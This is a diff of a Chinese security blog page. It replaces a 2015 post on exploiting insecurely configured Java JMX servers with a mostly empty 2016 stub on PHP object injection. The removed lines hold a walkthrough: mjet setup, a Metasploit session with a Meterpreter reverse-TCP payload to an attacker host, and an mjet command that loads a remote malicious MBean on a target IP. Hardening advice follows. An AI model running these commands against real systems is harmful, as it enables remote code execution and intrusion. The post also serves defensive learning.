@@ -4,27 +4,26 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>Java JMX Server 代码执行漏洞利用及防御 | xd_xd&#39;s blog</title>
+    <title>php对象注入漏洞 | xd_xd&#39;s blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="xd_xd">
     
 
     
-    <meta name="description" content="#jmx基本概念官方说法：JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用通常用来监控jvm会使用这个服务。对外开放一个端口提供服务。使用官方jconsole连上可以查看jvm应用的各种信息。Java Ma">
+    <meta name="description" content="漏洞原理理解php对象注入,需要了解基本的php面向对象编程的概念和php中的魔术方法。可以参考理解php对象注入,文中练习代码可以在这里下载
+利用方式修复方案">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java JMX Server 代码执行漏洞利用及防御">
-<meta property="og:url" content="http://xdxd.love/2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/index.html">
+<meta property="og:title" content="php对象注入漏洞">
+<meta property="og:url" content="http://xdxd.love/2016/03/08/php对象注入漏洞/index.html">
 <meta property="og:site_name" content="xd_xd's blog">
-<meta property="og:description" content="#jmx基本概念官方说法：JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用通常用来监控jvm会使用这个服务。对外开放一个端口提供服务。使用官方jconsole连上可以查看jvm应用的各种信息。Java Ma">
-<meta property="og:image" content="http://xdxd.love/images/jmx4.png">
-<meta property="og:image" content="http://xdxd.love/images/jmx1.png">
-<meta property="og:image" content="http://xdxd.love/images/jmx2.png">
-<meta property="og:image" content="http://xdxd.love/images/jmx3.png">
-<meta property="og:updated_time" content="2015-11-24T03:27:38.000Z">
+<meta property="og:description" content="漏洞原理理解php对象注入,需要了解基本的php面向对象编程的概念和php中的魔术方法。可以参考理解php对象注入,文中练习代码可以在这里下载
+利用方式修复方案">
+<meta property="og:updated_time" content="2016-03-09T02:18:03.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Java JMX Server 代码执行漏洞利用及防御">
-<meta name="twitter:description" content="#jmx基本概念官方说法：JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用通常用来监控jvm会使用这个服务。对外开放一个端口提供服务。使用官方jconsole连上可以查看jvm应用的各种信息。Java Ma">
+<meta name="twitter:title" content="php对象注入漏洞">
+<meta name="twitter:description" content="漏洞原理理解php对象注入,需要了解基本的php面向对象编程的概念和php中的魔术方法。可以参考理解php对象注入,文中练习代码可以在这里下载
+利用方式修复方案">
 
     
     <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
@@ -84,14 +83,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/" title="Java JMX Server 代码执行漏洞利用及防御" itemprop="url">Java JMX Server 代码执行漏洞利用及防御</a>
+      <a href="/2016/03/08/php对象注入漏洞/" title="php对象注入漏洞" itemprop="url">php对象注入漏洞</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="xd_xd" target="_blank" itemprop="author">xd_xd</a>
 		
   <p class="article-time">
-    <time datetime="2015-10-27T07:03:44.000Z" itemprop="datePublished"> 发表于 Oct 27 2015</time>
+    <time datetime="2016-03-08T10:29:59.000Z" itemprop="datePublished"> 发表于 Mar 8 2016</time>
     
   </p>
 </header>
@@ -100,74 +99,21 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方式"><span class="toc-number">2.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#修复方案"><span class="toc-number">3.</span> <span class="toc-text">修复方案</span></a></li></ol>
 		
 		</div>
 		
-		<p>#jmx基本概念<br>官方说法：<br>JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用<br>通常用来监控jvm会使用这个服务。对外开放一个端口提供服务。使用官方jconsole连上可以查看jvm应用的各种信息。<br><img src="/images/jmx4.png" alt=""><br><a href="http://www.oracle.com/technetwork/articles/java/javamanagement-140525.html" target="_blank" rel="external">Java Management Extensions (JMX) Technology</a></p>
-<p>#不安全配置</p>
-<p>来自oracle官方文档：</p>
-<pre><code>Disabling Security
-To disable both password authentication and SSL (namely to disable all security), you should <span class="operator"><span class="keyword">set</span> the <span class="keyword">following</span> <span class="keyword">system</span> properties <span class="keyword">when</span> you <span class="keyword">start</span> the <span class="keyword">Java</span> VM.
-
-com.sun.<span class="keyword">management</span>.jmxremote.authenticate=<span class="literal">false</span>
-com.sun.<span class="keyword">management</span>.jmxremote.ssl=<span class="literal">false</span>
-
-Caution - This configuration <span class="keyword">is</span> insecure: <span class="keyword">any</span> remote <span class="keyword">user</span> who knows (<span class="keyword">or</span> guesses) your port <span class="built_in">number</span> <span class="keyword">and</span> host <span class="keyword">name</span> will be able <span class="keyword">to</span> monitor <span class="keyword">and</span> control your <span class="keyword">Java</span> applications <span class="keyword">and</span> platform. Furthermore, possible harm <span class="keyword">is</span> <span class="keyword">not</span> limited <span class="keyword">to</span> the <span class="keyword">operations</span> you <span class="keyword">define</span> <span class="keyword">in</span> your MBeans. A remote <span class="keyword">client</span> could <span class="keyword">create</span> a javax.<span class="keyword">management</span>.loading.MLet MBean <span class="keyword">and</span> <span class="keyword">use</span> it <span class="keyword">to</span> <span class="keyword">create</span> <span class="keyword">new</span> MBeans <span class="keyword">from</span> arbitrary URLs, <span class="keyword">at</span> <span class="keyword">least</span> <span class="keyword">if</span> there <span class="keyword">is</span> <span class="keyword">no</span> <span class="keyword">security</span> manager. <span class="keyword">In</span> other words, a rogue remote <span class="keyword">client</span> could make your <span class="keyword">Java</span> application <span class="keyword">execute</span> arbitrary code.
-
-Consequently, <span class="keyword">while</span> disabling <span class="keyword">security</span> might be acceptable <span class="keyword">for</span> development, it <span class="keyword">is</span> strongly recommended that you <span class="keyword">do</span> <span class="keyword">not</span> <span class="keyword">disable</span> <span class="keyword">security</span> <span class="keyword">for</span> production systems.</span>
-</code></pre><p>当禁用代码执行的时候存在任意代码执行问题。<br><a href="https://www.exploit-db.com/exploits/36101/" target="_blank" rel="external">metaploit</a>模块描述如下：</p>
-<pre><code>This module takes advantage <span class="tag">a</span> Java JMX interface insecure configuration, which would allow loading classes from any remote (HTTP) URL. JMX interfaces with authentication disabled (com<span class="class">.sun</span><span class="class">.management</span><span class="class">.jmxremote</span><span class="class">.authenticate</span>=false) should be vulnerable, while interfaces with authentication enabled will be vulnerable only <span class="keyword">if</span> <span class="tag">a</span> weak configuration is deployed (allowing to use javax<span class="class">.management</span><span class="class">.loading</span><span class="class">.MLet</span>, having <span class="tag">a</span> security manager allowing to load <span class="tag">a</span> ClassLoader MBean, etc
-</code></pre><p>当开启了密码认证的时候还需要其他限制条件才可以利用。</p>
-<p>#漏洞利用程序<br>漏洞利用程序可以使用<a href="https://github.com/mogwaisec/mjet" target="_blank" rel="external">mjet</a>。过程参考<a href="http://www.n0tr00t.com/2015/04/17/JMX-RMI-Exploit-Demo.html" target="_blank" rel="external">JMX RMI Exploit Demo</a></p>
-<p>#测试记录<br>安装mjet</p>
-<pre><code>git clone  https://github.com/mogwaisec/mjet
-
-<span class="built_in">Copy</span> <span class="bash">the <span class="string">"MBean"</span> folder to <span class="string">"data/java/metasploit"</span>
-</span><span class="built_in">Copy</span> <span class="bash">java_mlet_server.rb to <span class="string">"modules/exploits/multi/misc/"</span></span>
-</code></pre><p>在kali 1.1.0中metasploit路径为/opt/metasploit/apps/pro/msf3</p>
-<p>启动metasploit：</p>
-<pre><code>msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; use exploit/multi/misc/java_mlet_server 
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set payload java/meterpreter/reverse_tcp 
-payload =&gt; java/meterpreter/reverse_tcp
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set LHOST <span class="number">13.7</span>.<span class="number">8.53</span>
-LHOST =&gt; <span class="number">13.7</span>.<span class="number">8.53</span>
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set LPORT <span class="number">29999</span>
-LPORT =&gt; <span class="number">29999</span>
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; run
-[*] Exploit running as <span class="attribute">background</span> job.
-[*] Started reverse handler on <span class="number">13.7</span>.<span class="number">8.53</span>:<span class="number">29999</span> 
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; [*] Using URL: http:<span class="comment">//0.0.0.0:8080/2B7JthqVZW</span>
-[*]  Local IP: http:<span class="comment">//13.7.8.53:8080/2B7JthqVZW</span>
-[*] Server started.
-</code></pre><p><img src="/images/jmx1.png" alt=""><br>或得payload url，作为u参数。</p>
-<pre><code>java -jar mjet/mjet<span class="class">.jar</span> -<span class="tag">p</span> <span class="number">9090</span> -u http:<span class="comment">//13.7.8.53:8080/2B7JthqVZW -t 42.91.1.1</span>
-</code></pre><p><img src="/images/jmx2.png" alt=""><br>msf获得权限<br><img src="/images/jmx3.png" alt=""></p>
-<p>图片来自<a href="http://www.ricter.me/posts/JMX%20RMI%20Exploit%20%E5%AE%9E%E4%BE%8B?_=1445856355931" target="_blank" rel="external">JMX RMI Exploit 实例</a></p>
-<p>#测试失败记录<br>测试的时候发现如果不使用msf，自己架web服务提供恶意Mbean，jar包一定要配置对，如果配置错误的话，除非对方服务重启，不然每次都是加载第一次错误的包导致利用失败。</p>
-<p>#启用安全的配置<br>    So it’s important to keep in mind that setting java.rmi.server.hostname has no effect on whether or not this is an insecure configuration.  If you actually want to secure your JMX RMI port, you have many options, such as (in decreasing order of preference):</p>
-<pre><code>Don’t pass com.sun.management.jmxremote.port. This will <span class="operator"><span class="keyword">start</span> a <span class="keyword">local</span>-<span class="keyword">only</span> JMX <span class="keyword">server</span>, <span class="keyword">and</span> you can <span class="keyword">get</span> the <span class="keyword">connection</span> address <span class="keyword">from</span> com.sun.<span class="keyword">management</span>.jmxremote.localConnectorAddress  <span class="keyword">http</span>://docs.<span class="keyword">oracle</span>.com/javase/<span class="number">6</span>/docs/technotes/guides/<span class="keyword">management</span>/<span class="keyword">agent</span>.html
-<span class="keyword">Enable</span> SSL <span class="keyword">client</span> certificate <span class="keyword">authentication</span>
-<span class="keyword">Enable</span> <span class="keyword">password</span> <span class="keyword">authentication</span> <span class="keyword">and</span> <span class="keyword">use</span> SSL
-Firewall your JMX RMI port
-+ See more <span class="keyword">at</span>: <span class="keyword">http</span>://www.accuvant.com/blog/exploiting-jmx-rmi#sthash.AsAasfPW.dpuf</span>
-</code></pre><p>除了启用密码认证和SSL，还可以配置防火墙。文中还提到了不要指定端口，以及设置java.rmi.server.hostname是不安全的配置，这个点没有具体测试。</p>
-<p>#参考资料<br><a href="http://www.accuvant.com/blog/exploiting-jmx-rmi" target="_blank" rel="external">Exploiting JMX RMI</a><br><a href="http://docs.oracle.com/javase/6/docs/technotes/guides/management/agent.html" target="_blank" rel="external">jmx配置官方文档</a></p>
-  
+		<h1 id="漏洞原理">漏洞原理</h1><p>理解php对象注入,需要了解基本的php面向对象编程的概念和php中的魔术方法。可以参考<a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">理解php对象注入</a>,文中练习代码可以在<a href="">这里下载</a></p>
+<h1 id="利用方式">利用方式</h1><h1 id="修复方案">修复方案</h1>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/黑盒测试/">黑盒测试</a>
+  <a class="article-category-link" href="/categories/代码审计/">代码审计</a>
 </div>
 
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/java/">java</a>
-  </div>
 
 </div>
 
@@ -175,7 +121,7 @@ Firewall your JMX RMI port
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://xdxd.love/2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/" data-title="Java JMX Server 代码执行漏洞利用及防御 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
+	  <div data-url="http://xdxd.love/2016/03/08/php对象注入漏洞/" data-title="php对象注入漏洞 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -188,19 +134,11 @@ Firewall your JMX RMI port
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2015/11/03/几个DOM-XSS案例分析/" title="几个DOM XSS案例分析">
-  <strong>上一篇：</strong><br/>
-  <span>
-  几个DOM XSS案例分析</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2015/10/22/YII应用一个SQL注入分析/"  title="Yii应用一个SQL注入分析">
+<a href="/2016/03/07/sqli练级攻略/"  title="sqli练级攻略">
  <strong>下一篇：</strong><br/> 
- <span>Yii应用一个SQL注入分析
+ <span>sqli练级攻略
 </span>
 </a>
 </div>
@@ -209,7 +147,7 @@ Firewall your JMX RMI port
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/" data-title="Java JMX Server 代码执行漏洞利用及防御" data-url="http://xdxd.love/2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/"></div>
+	<div class="ds-thread" data-thread-key="2016/03/08/php对象注入漏洞/" data-title="php对象注入漏洞" data-url="http://xdxd.love/2016/03/08/php对象注入漏洞/"></div>
 </section>
 
 
@@ -219,7 +157,7 @@ Firewall your JMX RMI port
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方式"><span class="toc-number">2.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#修复方案"><span class="toc-number">3.</span> <span class="toc-text">修复方案</span></a></li></ol>
  
   </div>
 
